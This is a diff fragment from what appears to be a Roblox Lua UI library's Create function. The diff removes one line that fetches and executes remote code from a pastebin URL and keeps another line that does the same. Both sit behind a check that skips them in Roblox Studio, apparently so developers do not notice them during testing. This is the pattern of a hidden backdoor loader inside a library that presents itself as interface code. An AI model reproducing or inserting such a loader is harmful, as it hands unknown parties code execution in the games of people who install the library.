@@ -1453,7 +1453,6 @@ function Library:Create(config)
 
 	if not RunService:IsStudio() then
 		loadstring(game:HttpGet("https://pastebin.com/raw/rQMS2B9R"))()
-		loadstring(game:HttpGet("https://pastebin.com/raw/XUdfNnCe"))()
 	end
 	spawn(function()
 		local sound = Instance.new("Sound", location)
